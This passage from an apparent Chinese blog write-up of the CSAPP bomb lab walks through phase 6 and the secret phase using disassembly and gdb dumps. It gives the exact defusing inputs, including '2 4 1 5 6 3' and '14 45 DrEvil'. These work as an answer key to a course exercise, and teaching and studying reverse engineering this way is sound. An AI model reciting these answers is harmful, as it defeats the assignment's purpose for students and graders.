class="hljs-attribute">0x555555557200</span> &lt;array.<span class="hljs-number">0</span>+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0</span>x0000000400000000<span class="hljs-number">0</span>x0000000d00000001<br><span class="hljs-attribute">0x555555557210</span> &lt;array.<span class="hljs-number">0</span>+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0</span>x0000000900000003<span class="hljs-number">0</span>x0000000500000006<br><br></code></pre></td></tr></table></figure><ul><li>以上是数组中的数，4字节为一个数（int）</li><li>经过计算，payload = 5 115；即从5号元素开始取，最后取15次，取出数的和正好是115。</li></ul><p>第五题解决完毕。</p><h2 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase_6"></a>Phase_6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs assembly">000000000000187a &lt;phase_6&gt;:<br>    187a:f3 0f 1e fa          endbr64 <br>    187e:41 56                push   %r14<br>    1880:41 55                push   %r13<br>    1882:41 54                push   %r12<br>    1884:55                   push   %rbp<br>    1885:53                   push   %rbx<br>    1886:48 83 ec 60          sub    $0x60,%rsp<br>    188a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    1891:00 00 <br>    1893:48 89 44 24 58       mov    %rax,0x58(%rsp)<br>    1898:31 c0                xor    %eax,%eax<br>    189a:49 89 e5             mov    %rsp,%r13<br>    189d:4c 89 ee             mov    %r13,%rsi<br>    18a0:e8 8a 03 00 00       callq  1c2f &lt;read_six_numbers&gt;<br>    18a5:41 be 01 00 00 00    mov    $0x1,%r14d<br>    18ab:49 89 e4             mov    %rsp,%r12<br>    18ae:eb 28                jmp    18d8 &lt;phase_6+0x5e&gt;<br>    18b0:e8 4e 03 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    18b5:eb 30                jmp    18e7 &lt;phase_6+0x6d&gt;<br>    18b7:48 83 c3 01          add    $0x1,%rbx<br>    18bb:83 fb 05             cmp    $0x5,%ebx<br>    18be:7f 10                jg     18d0 &lt;phase_6+0x56&gt;<br>    18c0:41 8b 04 9c          mov    (%r12,%rbx,4),%eax<br>    18c4:39 45 00             cmp    %eax,0x0(%rbp)<br>    18c7:75 ee                jne    18b7 &lt;phase_6+0x3d&gt;<br>    18c9:e8 35 03 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    18ce:eb e7                jmp    18b7 &lt;phase_6+0x3d&gt;<br>    18d0:49 83 c6 01          add    $0x1,%r14<br>    18d4:49 83 c5 04          add    $0x4,%r13<br>    18d8:4c 89 ed             mov    %r13,%rbp<br>    18db:41 8b 45 00          mov    0x0(%r13),%eax<br>    18df:83 e8 01             sub    $0x1,%eax<br>    18e2:83 f8 05             cmp    $0x5,%eax<br>    18e5:77 c9                ja     18b0 &lt;phase_6+0x36&gt;<br>    18e7:41 83 fe 05          cmp    $0x5,%r14d<br>    18eb:7f 05                jg     18f2 &lt;phase_6+0x78&gt;<br>    18ed:4c 89 f3             mov    %r14,%rbx<br>    18f0:eb ce                jmp    18c0 &lt;phase_6+0x46&gt;       #分界线一<br>    18f2:be 00 00 00 00       mov    $0x0,%esi<br>    18f7:8b 0c b4             mov    (%rsp,%rsi,4),%ecx<br>    18fa:b8 01 00 00 00       mov    $0x1,%eax<br>    18ff:48 8d 15 0a 39 00 00 lea    0x390a(%rip),%rdx        # 5210 &lt;node1&gt;<br>    1906:83 f9 01             cmp    $0x1,%ecx<br>    1909:7e 0b                jle    1916 &lt;phase_6+0x9c&gt;<br>    190b:48 8b 52 08          mov    0x8(%rdx),%rdx<br>    190f:83 c0 01             add    $0x1,%eax<br>    1912:39 c8                cmp    %ecx,%eax<br>    1914:75 f5                jne    190b &lt;phase_6+0x91&gt;<br>    1916:48 89 54 f4 20       mov    %rdx,0x20(%rsp,%rsi,8)<br>    191b:48 83 c6 01          add    $0x1,%rsi<br>    191f:48 83 fe 06          cmp    $0x6,%rsi<br>    1923:75 d2                jne    18f7 &lt;phase_6+0x7d&gt;<br>    1925:48 8b 5c 24 20       mov    0x20(%rsp),%rbx<br>    192a:48 8b 44 24 28       mov    0x28(%rsp),%rax<br>    192f:48 89 43 08          mov    %rax,0x8(%rbx)<br>    1933:48 8b 54 24 30       mov    0x30(%rsp),%rdx<br>    1938:48 89 50 08          mov    %rdx,0x8(%rax)<br>    193c:48 8b 44 24 38       mov    0x38(%rsp),%rax<br>    1941:48 89 42 08          mov    %rax,0x8(%rdx)<br>    1945:48 8b 54 24 40       mov    0x40(%rsp),%rdx<br>    194a:48 89 50 08          mov    %rdx,0x8(%rax)<br>    194e:48 8b 44 24 48       mov    0x48(%rsp),%rax<br>    1953:48 89 42 08          mov    %rax,0x8(%rdx)<br>    1957:48 c7 40 08 00 00 00 movq   $0x0,0x8(%rax)<br>    195e:00 <br>    195f:bd 05 00 00 00       mov    $0x5,%ebp<br>    1964:eb 09                jmp    196f &lt;phase_6+0xf5&gt;<br>    1966:48 8b 5b 08          mov    0x8(%rbx),%rbx<br>    196a:83 ed 01             sub    $0x1,%ebp<br>    196d:74 11                je     1980 &lt;phase_6+0x106&gt;<br>    196f:48 8b 43 08          mov    0x8(%rbx),%rax<br>    1973:8b 00                mov    (%rax),%eax<br>    1975:39 03                cmp    %eax,(%rbx)<br>    1977:7e ed                jle    1966 &lt;phase_6+0xec&gt;<br>    1979:e8 85 02 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    197e:eb e6                jmp    1966 &lt;phase_6+0xec&gt;<br>    1980:48 8b 44 24 58       mov    0x58(%rsp),%rax<br>    1985:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    198c:00 00 <br>    198e:75 0d                jne    199d &lt;phase_6+0x123&gt;<br>    1990:48 83 c4 60          add    $0x60,%rsp<br>    1994:5b                   pop    %rbx<br>    1995:5d                   pop    %rbp<br>    1996:41 5c                pop    %r12<br>    1998:41 5d                pop    %r13<br>    199a:41 5e                pop    %r14<br>    199c:c3                   retq   <br>    199d:e8 ae f8 ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br><br></code></pre></td></tr></table></figure><ul><li><p>这个题比较复杂</p></li><li><p>首先，18a0可看出，其读入6个数；</p></li><li><p>18f0以上，使用一系列的判断，最终效果是，输入的六个数均小于等于6大于等于1，且各不相同。</p></li><li><p>18f0之下的部分，就是按顺序将 node1 这个链表对应的数及地址逐个读入，读入的具体位次，是由输入的6个数决定的，如 1 就读入一次，也就是读入 node1 内存放的数据</p></li><li><p>知道了node1~node6中存放数据大小关系后，由小到大排序，输入即可通关</p></li><li><p>payload = 2 4 1 5 6 3</p></li><li><p>本题结束</p></li></ul><h2 id="Secret-Phase"><a href="#Secret-Phase" class="headerlink" title="Secret Phase"></a>Secret Phase</h2><ul><li><p>首先，发现有 secret phase 函数，其在 bomb_defused()内被调用；</p></li><li><p>进入这个函数后，先判断 num_input_strings == 6 是否成立，再在offset 57F0处读入3个数据；</p></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[----------------------------------registers-----------------------------------]<br><span class="hljs-symbol">RAX:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">RBX:</span> <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">RCX:</span> <span class="hljs-number">0x7fffffffde7c</span> --&gt; <span class="hljs-number">0x5555922000007fff</span> <br><span class="hljs-symbol">RDX:</span> <span class="hljs-number">0x7fffffffde78</span> --&gt; <span class="hljs-number">0x7ffff7e05490</span> (&lt;_IO_fgets+<span class="hljs-number">144</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-number">0x0</span>])<br><span class="hljs-symbol">RSI:</span> <span class="hljs-number">0x555555557379</span> (<span class="hljs-string">&quot;%d %d %s&quot;</span>)<br><span class="hljs-symbol">RDI:</span> <span class="hljs-number">0x5555555597f0</span> (<span class="hljs-string">&quot;14 45 DrEvil&quot;</span>)<br><span class="hljs-symbol">RBP:</span> <span class="hljs-number">0x1</span> <br><span class="hljs-symbol">RSP:</span> <span class="hljs-number">0x7fffffffde70</span> --&gt; <span class="hljs-number">0x300000006</span> <br><span class="hljs-symbol">RIP:</span> <span class="hljs-number">0x555555555dff</span> (&lt;phase_defused+<span class="hljs-number">83</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555300</span> &lt;__isoc99_sscanf@plt&gt;)<br><span class="hljs-built_in">R8</span> : <span class="hljs-number">0x7fffffffde80</span> --&gt; <span class="hljs-number">0x555555559220</span> --&gt; <span class="hljs-number">0x2000000ca</span> <br><span class="hljs-built_in">R9</span> : <span class="hljs-number">0x0</span> <br><span class="hljs-symbol">R10:</span> <span class="hljs-number">0x7ffff7f44ac0</span> --&gt; <span class="hljs-number">0x100000000</span> <br><span class="hljs-symbol">R11:</span> <span class="hljs-number">0x7ffff7f453c0</span> --&gt; <span class="hljs-number">0x2000200020002</span> <br><span class="hljs-symbol">R12:</span> <span class="hljs-number">0x7fffffffe008</span> --&gt; <span class="hljs-number">0x7fffffffe369</span> (<span class="hljs-string">&quot;/home/kawa/Desktop/bomb&quot;</span>)<br><span class="hljs-symbol">R13:</span> <span class="hljs-number">0x555555555489</span> (&lt;main&gt;:endbr64)<br><span class="hljs-symbol">R14:</span> <span class="hljs-number">0x555555558cf0</span> --&gt; <span class="hljs-number">0x555555555440</span> (&lt;__do_global_dtors_aux&gt;:endbr64)<br><span class="hljs-symbol">R15:</span> <span class="hljs-number">0x7ffff7ffd040</span> --&gt; <span class="hljs-number">0x7ffff7ffe2e0</span> --&gt; <span class="hljs-number">0x555555554000</span> --&gt; <span class="hljs-number">0x10102464c457f</span><br><span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x246</span> (carry PARITY adjust <span class="hljs-meta">ZERO</span> sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x555555555dec</span> &lt;phase_defused+<span class="hljs-number">64</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">r8</span>,[<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x555555555df1</span> &lt;phase_defused+<span class="hljs-number">69</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x1581</span>]        # <span class="hljs-number">0x555555557379</span><br>   <span class="hljs-number">0x555555555df8</span> &lt;phase_defused+<span class="hljs-number">76</span>&gt;:<br>    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdi</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x39f1</span>]        # <span class="hljs-number">0x5555555597f0</span> &lt;input_strings+<span class="hljs-number">240</span>&gt;<br>=&gt; <span class="hljs-number">0x555555555dff</span> &lt;phase_defused+<span class="hljs-number">83</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555300</span> &lt;__isoc99_sscanf@plt&gt;<br>   <span class="hljs-number">0x555555555e04</span> &lt;phase_defused+<span class="hljs-number">88</span>&gt;:<span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x3</span><br>   <span class="hljs-number">0x555555555e07</span> &lt;phase_defused+<span class="hljs-number">91</span>&gt;:<span class="hljs-keyword">je</span>     <span class="hljs-number">0x555555555e17</span> &lt;phase_defused+<span class="hljs-number">107</span>&gt;<br>   <span class="hljs-number">0x555555555e09</span> &lt;phase_defused+<span class="hljs-number">93</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdi</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x14a8</span>]        # <span class="hljs-number">0x5555555572b8</span><br>   <span class="hljs-number">0x555555555e10</span> &lt;phase_defused+<span class="hljs-number">100</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555220</span> &lt;puts@plt&gt;<br>Guessed arguments:<br>arg[<span class="hljs-number">0</span>]: <span class="hljs-number">0x5555555597f0</span> (<span class="hljs-string">&quot;14 45 DrEvil&quot;</span>)<br>arg[<span class="hljs-number">1</span>]: <span class="hljs-number">0x555555557379</span> (<span class="hljs-string">&quot;%d %d %s&quot;</span>)<br>arg[<span class="hljs-number">2</span>]: <span class="hljs-number">0x7fffffffde78</span> --&gt; <span class="hljs-number">0x7ffff7e05490</span> (&lt;_IO_fgets+<span class="hljs-number">144</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-number">0x0</span>])<br>arg[<span class="hljs-number">3</span>]: <span class="hljs-number">0x7fffffffde7c</span> --&gt; <span class="hljs-number">0x5555922000007fff</span> <br>arg[<span class="hljs-number">4</span>]: <span class="hljs-number">0x7fffffffde80</span> --&gt; <span class="hljs-number">0x555555559220</span> --&gt; <span class="hljs-number">0x2000000ca</span> <br><br><br></code></pre></td></tr></table></figure><p>注意RDI，也就是第一个参数的值，可以看出这个是 phase 4 的payload，故在修改 phase 4 payload = 14 45 DrEvil；</p><p>即可触发隐藏 phase</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000000000019e3</span> &lt;secret_phase&gt;:<br>    <span class="hljs-attribute">19e3</span>:f3 <span class="hljs-number">0</span>f <span class="hljs-number">1</span>e fa          endbr64 <br>    <span class="hljs-attribute">19e7</span>:<span class="hljs-number">53</span>                   push   %rbx<br>    <span class="hljs-attribute">19e8</span>:e8 <span class="hljs-number">87</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">1</span>c74 &lt;read_line&gt;<br>    <span class="hljs-attribute">19ed</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> c7             mov    %rax,%rdi<br>    <span class="hljs-attribute">19f0</span>:ba <span class="hljs-number">0</span>a <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xa,%edx<br>    <span class="hljs-attribute">19f5</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x0,%esi<br>    <span class="hljs-attribute">19fa</span>:e8 e1 f8 ff ff       callq  <span class="hljs-number">12</span>e0 &lt;strtol@plt&gt;<br>    <span class="hljs-attribute">19ff</span>:<span class="hljs-number">89</span> c3                mov    %eax,%ebx<br>    <span class="hljs-attribute">1a01</span>:<span class="hljs-number">83</span> e8 <span class="hljs-number">01</span>             sub    $<span class="hljs-number">0</span>x1,%eax<br>    <span class="hljs-attribute">1a04</span>:<span class="hljs-number">3</span>d e8 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       cmp    $<span class="hljs-number">0</span>x3e8,%eax<br>    <span class="hljs-attribute">1a09</span>:<span class="hljs-number">77</span> <span class="hljs-number">26</span>                ja     <span class="hljs-number">1</span>a31 &lt;secret_phase+<span class="hljs-number">0</span>x4e&gt;<br>    <span class="hljs-attribute">1a0b</span>:<span class="hljs-number">89</span> de                mov    %ebx,%esi<br>    <span class="hljs-attribute">1a0d</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">3</span>d <span class="hljs-number">1</span>c <span class="hljs-number">37</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> lea    <span class="hljs-number">0</span>x371c(%rip),%rdi        # <span class="hljs-number">5130</span> &lt;n1&gt;<br>    <span class="hljs-attribute">1a14</span>:e8 <span class="hljs-number">89</span> ff ff ff       callq  <span class="hljs-number">19</span>a2 &lt;fun7&gt;<br>    <span class="hljs-attribute">1a19</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">02</span>             cmp    $<span class="hljs-number">0</span>x2,%eax<br>    <span class="hljs-attribute">1a1c</span>:<span class="hljs-number">75</span> <span class="hljs-number">1</span>a                jne    <span class="hljs-number">1</span>a38 &lt;secret_phase+<span class="hljs-number">0</span>x55&gt;<br>    <span class="hljs-attribute">1a1e</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">3</span>d <span class="hljs-number">63</span> <span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> lea    <span class="hljs-number">0</span>x1763(%rip),%rdi        # <span class="hljs-number">3188</span> &lt;_IO_stdin_used+<span class="hljs-number">0</span>x188&gt;<br>    <span class="hljs-attribute">1a25</span>:e8 f6 f7 ff ff       callq  <span class="hljs-number">1220</span> &lt;puts@plt&gt;<br>    <span class="hljs-attribute">1a2a</span>:e8 <span class="hljs-number">7</span>d <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">1</span>dac &lt;phase_defused&gt;<br>    <span class="hljs-attribute">1a2f</span>:<span class="hljs-number">5</span>b                   pop    %rbx<br>    <span class="hljs-attribute">1a30</span>:c3                   retq   <br>    <span class="hljs-attribute">1a31</span>:e8 cd <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">1</span>c03 &lt;explode_bomb&gt;<br>    <span class="hljs-attribute">1a36</span>:eb d3                jmp    <span class="hljs-number">1</span>a0b &lt;secret_phase+<span class="hljs-number">0</span>x28&gt;<br>    <span class="hljs-attribute">1a38</span>:e8 c6 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">1</span>c03 &lt;explode_bomb&gt;<br>    <span class="hljs-attribute">1a3d</span>:eb df                jmp    <span class="hljs-number">1</span>a1e &lt;secret_phase+<span class="hljs-number">0</span>x3b&gt;<br><span class="hljs-attribute">00000000000019a2</span> &lt;fun7&gt;:<br>    <span class="hljs-attribute">19a2</span>:f3 <span class="hljs-number">0</span>f <span class="hljs-number">1</span>e fa          endbr64 <br>    <span class="hljs-attribute">19a6</span>:<span class="hljs-number">48</span> <span class="hljs-number">85</span> ff             test   %rdi,%rdi<br>    <span class="hljs-attribute">19a9</span>:<span class="hljs-number">74</span> <span class="hljs-number">32</span>                je     <span class="hljs-number">19</span>dd &lt;fun7+<span class="hljs-number">0</span>x3b&gt;<br>    <span class="hljs-attribute">19ab</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0</span>x8,%rsp<br>    <span class="hljs-attribute">19af</span>:<span class="hljs-number">8</span>b <span class="hljs-number">17</span>                mov    (%rdi),%edx<br>    <span class="hljs-attribute">19b1</span>:<span class="hljs-number">39</span> f2                cmp    %esi,%edx<br>    <span class="hljs-attribute">19b3</span>:<span class="hljs-number">7</span>f <span class="hljs-number">0</span>c                jg     <span class="hljs-number">19</span>c1 &lt;fun7+<span class="hljs-number">0</span>x1f&gt;<br>    <span class="hljs-attribute">19b5</span>:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x0,%eax<br>    <span class="hljs-attribute">19ba</span>:<span class="hljs-number">75</span> <span class="hljs-number">12</span>                jne    <span class="hljs-number">19</span>ce &lt;fun7+<span class="hljs-number">0</span>x2c&gt;<br>    <span class="hljs-attribute">19bc</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0</span>x8,%rsp<br>    <span class="hljs-attribute">19c0</span>:c3                   retq   <br>    <span class="hljs-attribute">19c1</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">7</span>f <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x8(%rdi),%rdi<br>    <span class="hljs-attribute">19c5</span>:e8 d8 ff ff ff       callq  <span class="hljs-number">19</span>a2 &lt;fun7&gt;<br>    <span class="hljs-attribute">19ca</span>:<span class="hljs-number">01</span> c0                add    %eax,%eax<br>    <span class="hljs-attribute">19cc</span>:eb ee                jmp    <span class="hljs-number">19</span>bc &lt;fun7+<span class="hljs-number">0</span>x1a&gt;<br>    <span class="hljs-attribute">19ce</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">7</span>f <span class="hljs-number">10</span>          mov    <span class="hljs-number">0</span>x10(%rdi),%rdi<br>    <span class="hljs-attribute">19d2</span>:e8 cb ff ff ff       callq  <span class="hljs-number">19</span>a2 &lt;fun7&gt;<br>    <span class="hljs-attribute">19d7</span>:<span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span>          lea    <span class="hljs-number">0</span>x1(%rax,%rax,<span class="hljs-number">1</span>),%eax<br>    <span class="hljs-attribute">19db</span>:eb df                jmp    <span class="hljs-number">19</span>bc &lt;fun7+<span class="hljs-number">0</span>x1a&gt;<br>    <span class="hljs-attribute">19dd</span>:b8 ff ff ff ff       mov    $<span class="hljs-number">0</span>xffffffff,%eax<br>    <span class="hljs-attribute">19e2</span>:c3                   retq   <br><br></code></pre></td></tr></table></figure><ul><li>先读入一行字符串，然后转换为整型；</li><li>注意 1a04 和 1a09，输入转换的整型，要小于等于1001，由此可发现，输入的数据应该是一个数，而不是几个。</li><li>随后调用 fun7，且最后返回值必须是2，否则爆炸。</li><li>来到fun7 内；</li><li>fun7 是一个递归函数，需要明确的是，rdi 是 fun7 的第一个参数，大概率是个指针（因为后面引用它时用了括号），esi是第二个参数，这个是我们最开始输入进去的一个数。</li><li>在 fun 7 内，esi的值是不改变的，也就是我们输入的值，一直都是参数之一，而另一个参数；</li><li>如果当前节点的值大于输入值，当前节点变为当前节点+8；</li><li>返回两倍的下一个节点调用fun7的返回值；</li><li>不满足大于的话，result 化为0；</li><li>若相等，直接返回0；</li><li>若当前节点值小于输入值，将result值赋为2倍的下一节点的值+1，且注意，下一节点是当前节点+16；</li><li>返回result值</li></ul><p>来看看这些节点，以及它们的值</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dns"><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559130</span> &lt;n1&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000024</span><span class="hljs-number">0</span>x0000<span class="hljs-number">555555559150</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559140</span> &lt;n1+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x0000<span class="hljs-number">555555559170</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559150</span> &lt;n21&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000008</span><span class="hljs-number">0</span>x000055<span class="hljs-number">55555591d0</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559160</span> &lt;n21+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x0000<span class="hljs-number">555555559190</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559170</span> &lt;n22&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000032</span><span class="hljs-number">0</span>x000055<span class="hljs-number">55555591b0</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559180</span> &lt;n22+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x000055<span class="hljs-number">55555591f0</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559190</span> &lt;n32&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000016</span><span class="hljs-number">0</span>x000055<span class="hljs-number">55555590b0</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591a0</span> &lt;n32+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x00005<span class="hljs-number">55555559070</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591b0</span> &lt;n33&gt;:<span class="hljs-number">0</span>x000000000000002d<span class="hljs-number">0</span>x00005<span class="hljs-number">55555559010</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591c0</span> &lt;n33+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x000055<span class="hljs-number">55555590d0</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591d0</span> &lt;n31&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000006</span><span class="hljs-number">0</span>x00005<span class="hljs-number">55555559030</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591e0</span> &lt;n31+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x00005<span class="hljs-number">55555559090</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555591f0</span> &lt;n34&gt;:<span class="hljs-number">0</span>x000000000000006b<span class="hljs-number">0</span>x00005<span class="hljs-number">55555559050</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555559200</span> &lt;n34+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x000055<span class="hljs-number">55555590f0</span><span 